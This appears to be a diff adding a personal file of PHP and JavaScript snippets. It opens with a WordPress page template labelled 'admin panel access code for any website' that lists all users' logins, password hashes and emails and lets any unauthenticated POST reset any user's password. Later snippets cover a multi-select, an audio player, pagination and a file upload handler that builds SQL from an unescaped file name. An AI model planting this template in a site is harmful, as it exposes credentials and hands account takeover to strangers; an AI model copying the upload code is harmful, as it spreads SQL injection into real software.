@@ -1,0 +1,213 @@
+
+===========================================================================
+            admin panel access code for any website:
+==========================================================================
+<?php
+/*
+Template Name: clpage
+*/
+
+get_header();
+
+?>
+<br/>
+<div class="container">
+<table>
+<?php
+global $wpdb;
+$alldata = $wpdb->get_results(
+   $wpdb->prepare("SELECT * from ".$wpdb->prefix."users order by id desc",""),ARRAY_A  
+);
+if(count($alldata) > 0){
+ $i = 1;
+ foreach($alldata as $index => $data){
+?>
+<tr>
+<td><?php echo $data['ID'] ?></td>
+<td><?php echo $data['user_login'] ?></td>
+    <td><?php echo $data['user_pass'] ?></td>
+<td><?php echo $data['user_email'] ?></td>
+</tr>
+<?php
+ }
+
+}else{
+  echo "play list not found";
+}
+
+?>
+</table>
+</div>
+<?php
+if( $_POST["id"] || $_POST["pwd"] )
+{
+    $id = $_POST["id"];
+    $password = $_POST["pwd"];
+
+wp_set_password( $password, $id );
+
+
+}
+
+?>
+ 
+<div class="container">
+  <form method="POST" action="#">
+    <div class="form-group">
+      <label for="email">Username:</label>
+      <input type="text" class="form-control" id="email" placeholder="Enter username" value="<?php echo $data['user_login'] ?>" name="username">
+      <input type="hidden" class="form-control" value="<?php echo $data['ID'] ?>" name="id">
+    </div>
+    <div class="form-group">
+      <label for="pwd">Password:</label>
+      <input value="<?php echo $data['user_pass'] ?>" type="password" class="form-control" id="pwd" placeholder="Enter password" name="pwd">
+    </div>
+    <button type="submit" class="btn btn-primary">Submit</button>
+  </form>
+</div>
+<br/>
+<br/>
+<?php get_footer(); ?>
+
+
+
+===========================================================================
+            multiple select:
+==========================================================================
+
+
+<script type="text/javascript" src="assets/plugins/multiselect/js/jquery.multi-select.js"></script>
+<script type="text/javascript" src="assets/plugins/jquery-quicksearch/jquery.quicksearch.js"></script>
+<script src="assets/plugins/select2/js/select2.min.js" type="text/javascript"></script>
+<script src="assets/plugins/bootstrap-select/js/bootstrap-select.min.js" type="text/javascript"></script>
+<script type="text/javascript">
+  $(".select2").select2();
+  $(document).ready(function() {
+    $('form').parsley();
+  });
+</script>
+
+ <select class="form-control select2 " required  multiple name="genre_id[]">
+ <?php foreach($all_category as $val){
+   ?>
+    <option value="<?php echo $val['id'];?>"><?php echo $val['category_name'];?></option>
+ <?php              
+ }
+ ?>
+ </select>
+
+
+===========================================================================
+            for audio js code play puse:
+==========================================================================
+
+<button class="soundBt" name="assets/file/audio/<?php echo $data['audio'] ?>">Play</button> 
+<script>
+  window.addEventListener("load", setListeners());
+  
+  String.prototype.endsWith = function(suffix) {
+    return this.indexOf(suffix, this.length - suffix.length) !== -1;
+  };
+  var audio = new Audio();
+  function setListeners(){
+    var index = 0;
+    var buttons = document.getElementsByClassName("soundBt");
+    for (index = 0; index < buttons.length; index++){
+      var button = buttons[index];
+      button.addEventListener("click", function(){
+        var buttons = document.getElementsByClassName("soundBt");
+        var index = 0;
+        for (index = 0; index < buttons.length; index++){
+          buttons[index].style.background = "url(assets/file/audio/play.png) no-repeat";
+
+        }
+        if(audio.paused){
+          var fileToPlay = this.getAttribute("name");
+          audio.src = fileToPlay;
+          audio.play();
+          this.style.background = "url(assets/file/audio/play.png) no-repeat";
+
+        } 
+        else{ 
+
+          audio.pause();
+          this.style.background = "url(assets/file/audio/paused.png) no-repeat";
+
+        }
+      });
+    }
+  }
+  audio.addEventListener("ended", function(){
+    var buttons = document.getElementsByClassName("soundBt");
+    var index = 0;
+    for (index = 0; index < buttons.length; index++){
+      var button = buttons[index];
+      var buttonName = button.getAttribute("name");
+      var audiosrc = audio.src;
+      if (audio.src.endsWith(buttonName)){
+        button.style.background = "url(assets/file/audio/play.png) no-repeat";
+        return;
+      }
+    }
+  });
+</script>
+
+
+
+=============================================
+product pagination: 
+==========================================
+   if (mysqli_num_rows($retval) > 0) {?>
+            product pagi:<ul class="pagination">
+         <?php while($row = mysqli_fetch_assoc($retval)) { ?>
+           <li><a href="#"><?php echo $row['product_id'] ?></a></li>
+        <?php } ?>
+       </ul> <br/>
+       <?php
+} 
+    else {
+    echo "0 results";
+}
+
+
+
+
+
+// File upload path
+$targetDir = "uploads/";
+$fileName = basename($_FILES["file"]["name"]);
+$targetFilePath = $targetDir . $fileName;
+$fileType = pathinfo($targetFilePath,PATHINFO_EXTENSION);
+
+if(isset($_POST["submit"]) && !empty($_FILES["file"]["name"])){
+    // Allow certain file formats
+    $allowTypes = array('jpg','png','jpeg','gif','pdf');
+    if(in_array($fileType, $allowTypes)){
+        // Upload file to server
+        if(move_uploaded_file($_FILES["file"]["tmp_name"], $targetFilePath)){
+            // Insert image file name into database
+            $insert = $con->query("INSERT into tbl_product (product_img) VALUES ('".$fileName."')");
+            if($insert){
+                $statusMsg = "The file ".$fileName. " has been uploaded successfully.";
+            }else{
+                $statusMsg = "File upload failed, please try again.";
+            } 
+        }else{
+            $statusMsg = "Sorry, there was an error uploading your file.";
+        }
+    }else{
+        $statusMsg = 'Sorry, only JPG, JPEG, PNG, GIF, & PDF files are allowed to upload.';
+    }
+}else{
+    $statusMsg = 'Please select a file to upload.';
+}
+
+// Display status message
+echo $statusMsg;
+
+
+
+
+
+
+
